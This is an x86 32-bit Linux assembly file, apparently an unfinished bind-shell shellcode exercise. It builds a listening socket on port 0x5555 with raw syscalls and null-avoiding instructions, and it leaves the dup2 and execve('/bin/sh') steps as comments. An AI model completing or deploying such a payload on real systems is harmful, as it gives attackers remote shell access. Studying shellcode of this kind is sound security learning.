global _start

section .text
_start:

	; 359 socket(AF_INET, SOCK_STREAM, 0); 
	; 	or do I need 102 (socketcall) on 32-bit? 
    xor eax, eax
    mov ax, 359     ; 359 = socket
    xor ebx, ebx
    mov bl, 2       ; 2 = AF_INET
    xor ecx, ecx    
    inc ecx         ; 1 = SOCK_STREAM
    xor edx, edx    ; 0
    int 0x80 

    ; store the fd returned in eax
    mov ebx, eax

	; sockaddr struct, built on the stack
	;	sin_port = htons(SOMEPORT)

    ;	sin_addr.s_addr = htonl(INADDR_ANY)
    ;xor eax, eax
    ;inc eax         ; eax = 0x00000001
    ;mov ax, 0x0255 
    ;shl eax, 16     ; eax = 0x00020000?
    ;mov ah, 0x55
    ;xor eax, eax
    ;add ax, 0x55555   ; 21845 in decimal
	;push eax

    ;	sin_addr.s_addr = htonl(INADDR_ANY)
    xor eax, eax
    push eax
	;	sin_family = AF_INET
    ;xor eax, eax
    push word 0x5555    ; 21845
    push word 2
    mov ecx, esp    ; pointer to our struct

	; 361 bind(fd, sockaddr *, sizeof(sockaddr))
    mov ax, 361    ; 361 = bind
    ; fd set back on line 18
    ; sockaddr * set back on line 31
    xor edx, edx
    mov dl, 16      ; sizeof(sockaddr) = 16
    int 0x80

	; 363 listen(fd, backlog)
    xor eax, eax
    mov ax, 363     ; 363 = listen
    ; fd set in previous syscall
    xor ecx, ecx
    inc ecx         ; backlog of 1
    int 0x80
 
	; 364 accept(fd, NULL, NULL) --> conn_fd
    xor eax, eax
    mov ax, 364     ; 364 = accept
    ; fd set in previous syscall
    xor ecx, ecx    ; addr = NULL
    xor edx, edx    ; addrlen = NULL
    int 0x80
    
    ; temporarily stick accepted socket fd into exit return code 
    ;  for testing
    mov ebx, eax

	; 63 dup2(conn_fd, 0-2)

	; 11 execve("/bin/sh", NULL, NULL)

	; cleanup code...
	
    ; clean exit
	xor eax, eax    
    inc al          ; 1 = exit
    ;xor ebx, ebx    ; 0 = return SUCCESS
    int 0x80
